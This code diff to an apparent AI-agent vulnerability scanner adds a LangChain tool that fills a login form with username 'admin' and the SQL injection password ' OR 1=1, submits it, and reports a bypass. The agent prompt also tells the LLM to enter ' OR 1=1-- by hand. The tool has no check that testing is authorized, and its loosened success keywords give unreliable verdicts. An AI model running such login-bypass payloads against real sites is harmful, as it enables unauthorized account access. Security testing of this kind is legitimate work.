@@ -66,15 +66,25 @@ class InputTextBoxTool(BaseTool):
             if not query or query.lower() in ['none', 'null', '']:
                 return "Error: Input required in format 'selector,text'"
             
-            parts = query.split(',', 1)
-            if len(parts) != 2:
+            # More robust parsing to handle quotes and commas in text
+            if ',' not in query:
                 return "Error: Input should be 'selector,text'"
-            selector, text = parts[0].strip(), parts[1].strip()
+            
+            # Split only on the first comma to handle commas in text
+            selector, text = query.split(',', 1)
+            selector = selector.strip().strip('"').strip("'")
+            text = text.strip().strip('"').strip("'")
             
             if not current_session:
                 return "Error: Session not initialized"
             
+            # Clear the field first, then fill it
+            await current_session.page.fill(selector, "")
             await current_session.fill_input(selector, text)
+            
+            # Wait a moment for any dynamic validation
+            await asyncio.sleep(0.5)
+            
             return f"Successfully typed '{text}' into element with selector '{selector}'"
         except Exception as e:
             return f"Error typing into textbox: {str(e)}\n{traceback.format_exc()}"
@@ -103,14 +113,40 @@ class ClickButtonTool(BaseTool):
             if not query or query.lower() in ['none', 'null', '']:
                 return "Error: CSS selector required"
             
-            selector = query.strip()
+            selector = query.strip().strip('"').strip("'")
             if not current_session:
                 return "Error: Session not initialized"
             
+            # Store current URL to detect navigation
+            current_url = current_session.page.url
+            
+            # Click the element
             await current_session.click(selector)
-            # Wait a moment for any page changes
-            await asyncio.sleep(1)
-            return f"Successfully clicked element with selector '{selector}'"
+            
+            # Wait for potential navigation or page changes
+            try:
+                # Wait up to 3 seconds for URL change or network idle
+                await asyncio.wait_for(
+                    current_session.page.wait_for_function(
+                        f"window.location.href !== '{current_url}'"
+                    ), 
+                    timeout=3.0
+                )
+                print("Page navigation detected")
+            except asyncio.TimeoutError:
+                print("No navigation detected, waiting for network idle")
+                try:
+                    await current_session.wait_for_network_idle(timeout=2000)
+                except:
+                    # If network idle fails, just wait a moment
+                    await asyncio.sleep(1)
+            
+            new_url = current_session.page.url
+            if new_url != current_url:
+                return f"Successfully clicked element '{selector}' - navigated from {current_url} to {new_url}"
+            else:
+                return f"Successfully clicked element '{selector}' - no navigation detected"
+                
         except Exception as e:
             return f"Error clicking button: {str(e)}\n{traceback.format_exc()}"
 
@@ -221,12 +257,117 @@ class ScrapePageTool(BaseTool):
             return f"Error scraping page: {str(e)}\n{traceback.format_exc()}"
 
 
+# Add a new tool for testing multiple SQL injection payloads
+class SqlInjectionTestInput(BaseModel):
+    """Input for SqlInjectionTestTool"""
+    query: str = Field(description="Username and password selectors (e.g., '#username,#password')")
+
+
+class SqlInjectionTestTool(BaseTool):
+    """Tool for systematic SQL injection testing"""
+    name: str = "sql_injection_test"
+    description: str = """Use this to test SQL injection with admin username and ' OR 1=1 password.
+    Input should be: username_selector,password_selector (e.g., "#username,#password")"""
+    args_schema: Type[BaseModel] = SqlInjectionTestInput
+    
+    def _run(self, query: str) -> str:
+        return "Error: Use async version"
+    
+    async def _arun(self, query: str) -> str:
+        """Execute SQL injection testing with admin/' OR 1=1"""
+        print(f"Starting SQL injection test with query: {query}")
+        try:
+            if not query or ',' not in query:
+                return "Error: Input should be 'username_selector,password_selector'"
+            
+            username_selector, password_selector = query.split(',', 1)
+            username_selector = username_selector.strip()
+            password_selector = password_selector.strip()
+            
+            if not current_session:
+                return "Error: Session not initialized"
+            
+            # Single SQL injection payload to test
+            username = "admin"
+            password_payload = "' OR 1=1"
+            
+            print(f"Testing with username: {username} and password: {password_payload}")
+            
+            try:
+                # Store original URL
+                original_url = current_session.page.url
+                
+                # Clear and fill username
+                await current_session.page.fill(username_selector, "")
+                await current_session.fill_input(username_selector, username)
+                await asyncio.sleep(0.3)
+                
+                # Clear and fill password with payload
+                await current_session.page.fill(password_selector, "")
+                await current_session.fill_input(password_selector, password_payload)
+                await asyncio.sleep(0.3)
+                
+                # Submit form (try different submit methods)
+                current_url = current_session.page.url
+                
+                try:
+                    # Try clicking submit button
+                    await current_session.click("input[type='submit']")
+                except:
+                    try:
+                        # Alternative: try button element
+                        await current_session.click("button[type='submit']")
+                    except:
+                        try:
+                            # Last resort: press Enter on password field
+                            await current_session.page.press(password_selector, "Enter")
+                        except:
+                            return "Could not submit form - no submit button found"
+                
+                # Wait for response
+                try:
+                    await asyncio.wait_for(
+                        current_session.page.wait_for_function(
+                            f"window.location.href !== '{current_url}' || document.body.textContent.includes('Welcome') || document.body.textContent.includes('Dashboard') || document.body.textContent.includes('successful')"
+                        ), 
+                        timeout=3.0
+                    )
+                except asyncio.TimeoutError:
+                    pass
+                
+                # Check result
+                new_url = current_session.page.url
+                page_content = await current_session.get_content(format=ContentFormat.TEXT)
+                
+                # Check for success indicators
+                success_indicators = [
+                    'welcome', 'dashboard', 'successful', 'logged in', 
+                    'authentication successful', 'home', 'profile', 'logout'
+                ]
+                
+                page_lower = page_content.lower()
+                has_success_indicator = any(indicator in page_lower for indicator in success_indicators)
+                
+                if new_url != current_url:
+                    return f"🚨 SQL INJECTION SUCCESSFUL: Username 'admin' with password '" + password_payload + f"' caused navigation from {current_url} to {new_url}"
+                elif has_success_indicator:
+                    return f"🚨 SQL INJECTION SUCCESSFUL: Username 'admin' with password '" + password_payload + "' - success indicators detected in page content"
+                else:
+                    return f"SQL injection failed: Username 'admin' with password '" + password_payload + "' - no success indicators detected"
+                
+            except Exception as e:
+                return f"Error during SQL injection test: {str(e)}"
+            
+        except Exception as e:
+            return f"Error in SQL injection testing: {str(e)}\n{traceback.format_exc()}"
+
+
 def create_vulnerability_agent() -> AgentExecutor:
     """Create a LangChain agent with Playwright tools for vulnerability testing"""
     
     # Initialize OpenAI LLM
     llm = ChatOpenAI(
-        model="gpt-4.1-mini",
+        model="gpt-4o-mini",
         temperature=0,
         openai_api_key=os.getenv("OPENAI_API_KEY")
     )
@@ -235,7 +376,8 @@ def create_vulnerability_agent() -> AgentExecutor:
     tools = [
         InputTextBoxTool(),
         ClickButtonTool(),
-        ScrapePageTool()
+        ScrapePageTool(),
+        SqlInjectionTestTool()
     ]
     
     # Use a custom prompt that handles tool inputs better
@@ -257,8 +399,9 @@ Final Answer: the final answer to the original input question
 
 IMPORTANT: 
 - For scrape_page tool, always use "scrape" as Action Input
-- For input_textbox tool, use format "selector,text" as Action Input
+- For input_textbox tool, use format "selector,text" as Action Input (no quotes around the entire string)
 - For click_button tool, use the CSS selector as Action Input
+- For sql_injection_test tool, use format "username_selector,password_selector" as Action Input
 - Never use None, null, or empty values as Action Input
 
 Begin!
@@ -274,7 +417,7 @@ Thought:{agent_scratchpad}""")
         agent=agent,
         tools=tools,
         verbose=True,
-        max_iterations=15,
+        max_iterations=20,
         handle_parsing_errors=True,
         return_intermediate_steps=True
     )
@@ -299,7 +442,7 @@ async def run_vulnerability_test(target_url: str) -> Dict[str, Any]:
     
     try:
         print(f"🌐 Testing {target_url}...")
-        config = SessionConfig(headless=True, timeout=10000)
+        config = SessionConfig(headless=True, timeout=15000)
         
         async with WebSession(target_url, config) as session:
             current_session = session
@@ -311,23 +454,25 @@ async def run_vulnerability_test(target_url: str) -> Dict[str, Any]:
             initial_prompt = f"""
             You are a web security expert testing the login page at {target_url} for SQL injection vulnerabilities.
             
-            You have access to three tools:
+            You have access to four tools:
             1. scrape_page: Get current page content and detect forms/inputs (Action Input: "scrape")
             2. input_textbox: Enter text into input fields (Action Input: "selector,text")
             3. click_button: Click buttons or submit forms (Action Input: "selector")
+            4. sql_injection_test: Systematically test multiple SQL injection payloads (Action Input: "username_selector,password_selector")
             
             IMPORTANT: Always provide proper Action Input strings - never use None, null, or empty values.
             
             Please follow these steps systematically:
             1. Use scrape_page with Action Input "scrape" to understand the page structure
-            2. Identify login form fields (username/password inputs)
-            3. Test SQL injection by:
-               - Using input_textbox with Action Input "#username,admin" to enter username
-               - Using input_textbox with Action Input "#password,' OR 1=1--" to enter malicious password  
-               - Using click_button with Action Input "input[type='submit']" to submit the form
-            4. Use scrape_page with Action Input "scrape" again to check if login was successful
-            5. Look for signs of successful login (welcome messages, dashboard, etc.)
-            6. Report whether SQL injection vulnerability was detected
+            2. Identify login form fields (username/password inputs) and their selectors
+            3. Use sql_injection_test with Action Input "username_selector,password_selector" to test multiple payloads systematically
+            4. If sql_injection_test doesn't work, try manual testing:
+               - Using input_textbox with Action Input "selector,admin" to enter username
+               - Using input_textbox with Action Input "selector,' OR 1=1--" to enter malicious password
+               - Using click_button to submit the form
+            5. Use scrape_page with Action Input "scrape" again to check if login was successful
+            6. Look for signs of successful login (welcome messages, dashboard, different URL, etc.)
+            7. Report whether SQL injection vulnerability was detected
             
             Begin your assessment now.
             """
@@ -344,8 +489,8 @@ async def run_vulnerability_test(target_url: str) -> Dict[str, Any]:
             # Check for vulnerability indicators
             agent_output = results["agent_output"].lower()
             results["vulnerabilities_detected"] = any(indicator in agent_output for indicator in [
-                "sql injection", "vulnerability found", "successful injection", 
-                "bypass", "xss", "script injection"
+                "sql injection", "vulnerability found", "successful", "🚨", 
+                "bypass", "authentication bypassed", "dashboard", "welcome"
             ])
             
     except Exception as e:
